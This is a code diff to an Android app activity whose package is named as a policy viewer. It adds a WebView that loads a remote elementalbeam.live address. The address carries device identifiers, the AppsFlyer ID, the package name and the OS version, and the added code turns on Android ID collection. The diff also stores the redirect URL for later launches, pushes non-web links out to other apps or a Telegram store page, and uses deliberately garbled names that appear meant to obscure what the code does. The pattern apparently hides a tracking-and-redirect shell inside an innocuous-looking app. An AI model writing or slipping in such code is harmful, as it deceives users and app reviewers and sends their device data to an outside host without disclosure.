@@ -1,15 +1,17 @@
 package com.vectorunit.purple.policy
 
+import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
 import android.net.Uri
-import android.os.Bundle
-import android.os.Environment
+import android.os.*
 import android.provider.MediaStore
 import android.util.Log
+import android.view.View
 import android.webkit.*
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import com.appsflyer.AppsFlyerLib
 import com.vectorunit.purple.databinding.ActivityBeamBinding
 import org.koin.androidx.viewmodel.ext.android.viewModel
 import org.koin.core.qualifier.named
@@ -42,11 +44,34 @@ class BeamAct : AppCompatActivity() {
 
 
         beam.webViewClient = object : WebViewClient() {
-            override fun shouldOverrideUrlLoading(
-                view: WebView?,
-                request: WebResourceRequest?
-            ): Boolean {
-                return super.shouldOverrideUrlLoading(view, request)
+            override fun shouldOverrideUrlLoading(view: WebView?, url: String): Boolean {
+                try {
+                    if (URLUtil.isNetworkUrl(url)) {
+                        return false
+                    }
+                    if (viewBeamModel.appInstalledOrNot(url)) {
+
+                        val intent = Intent(Intent.ACTION_VIEW)
+                        intent.data = Uri.parse(url)
+                        startActivity(intent)
+                    } else {
+
+                        Toast.makeText(
+                            applicationContext,
+                            "Application is not installed",
+                            Toast.LENGTH_LONG
+                        ).show()
+                        startActivity(
+                            Intent(
+                                Intent.ACTION_VIEW,
+                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
+                            )
+                        )
+                    }
+                    return true
+                } catch (e: Exception) {
+                    return false
+                }
             }
 
             override fun onPageFinished(view: WebView?, url: String?) {
@@ -55,7 +80,6 @@ class BeamAct : AppCompatActivity() {
 
             override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                 super.onPageStarted(view, url, favicon)
-
             }
 
             override fun onReceivedError(
@@ -69,8 +93,7 @@ class BeamAct : AppCompatActivity() {
         }
 
         beam.webChromeClient = ChromeClient()
-        beam.loadUrl("http://elementalbeam.live/go.php?to=2&")
-
+        beam.loadUrl(urururururururur())
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -153,4 +176,114 @@ class BeamAct : AppCompatActivity() {
             )
         }
     }
-}
+
+    private fun urururururururur(): String {
+
+        val sharPre = getSharedPreferences("SHARED_PREF",
+            Context.MODE_PRIVATE)
+
+        val pack = application.packageName.toString()
+
+        val intent = intent
+        val str = intent.getStringExtra("WebInt")
+
+
+        val myTrId = sharPre.getString("myId", null)
+        val myInstId: String? = sharPre.getString("instId", null)
+        val cpOne: String? = sharPre.getString(C1, null)
+        val dpOne: String? = sharPre.getString(deepL, null)
+        val mainId: String? = sharPre.getString(MAIN_ID, "null")
+        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
+        AppsFlyerLib.getInstance().setCollectAndroidID(true)
+
+
+        val one = "deviceID="
+        val subOne = "sub_id_1="
+        val thrhtrhtrhtrht = "ad_id="
+        val fofofofofofofofofo = "sub_id_4="
+        val fififififififififif = "sub_id_5="
+        val sisisisifsisis = "sub_id_6="
+
+        val lololololololo = "naming"
+        val trololo = "deeporg"
+
+
+        val kiokjjlikjhmkij = Build.VERSION.RELEASE
+
+//        val linkAB: String? = sharPre.getString(urlMain, null)
+
+        val linkAB = "http://elementalbeam.live/go.php?to=2&"
+
+        val linkNO = "https://www.privacy"
+        val linkNT = "policies.com/live/"
+        val linkNTH = "e0638d9d-11f4-4194-af55-8a8b10c66d2d"
+
+        var aft = ""
+
+        when (str) {
+            "MT" -> {
+                aft =
+                    "$linkAB$one$myTrId&$thrhtrhtrhtrht$myInstId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+                viewBeamModel.pushToOS(myTrId.toString())
+                Log.d("TESTAG", "urururururururur tracker: $aft")
+            }
+            "deepLink" -> {
+                aft ="$linkAB$subOne$dpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$trololo"
+                viewBeamModel.pushToOS(myTrId.toString())
+                Log.d("TESTAG", "urururururururur deep: $aft")
+            }
+            "campaign" -> {
+                aft =
+                    "$linkAB$subOne$cpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+                viewBeamModel.pushToOS(afId.toString())
+                Log.d("TESTAG", "urururururururur apps: $aft")
+            }
+            "policy" -> {
+                aft = "$linkNO$linkNT$linkNTH"
+                Log.d("TESTAG", "urururururururur policy: $aft")
+            }
+        }
+
+        return sharPre.getString("SAVED_URL", aft).toString()
+    }
+
+    var firsl = ""
+    fun saveUrl(lurlurlurlurlur: String?) {
+        if (!lurlurlurlurlur!!.contains("t.me")) {
+
+            if (firsl == "") {
+                firsl = getSharedPreferences(
+                    "SHARED_PREF",
+                    MODE_PRIVATE
+                ).getString(
+                    "SAVED_URL",
+                    lurlurlurlurlur
+                ).toString()
+
+                val spspspspsppspspsp = getSharedPreferences("SHARED_PREF", MODE_PRIVATE)
+                val ededededededed = spspspspsppspspsp.edit()
+                ededededededed.putString("SAVED_URL", lurlurlurlurlur)
+                ededededededed.apply()
+            }
+        }
+    }
+    private var exitexitexitexit = false
+    override fun onBackPressed() {
+
+            if (beam.canGoBack()) {
+                if (exitexitexitexit) {
+                    beam.stopLoading()
+                    beam.loadUrl(firsl)
+                }
+                this.exitexitexitexit = true
+                beam.goBack()
+                Handler(Looper.getMainLooper()).postDelayed(Runnable {
+                    exitexitexitexit = false
+                }, 2000)
+
+            } else {
+                super.onBackPressed()
+            }
+        }
+    }
+
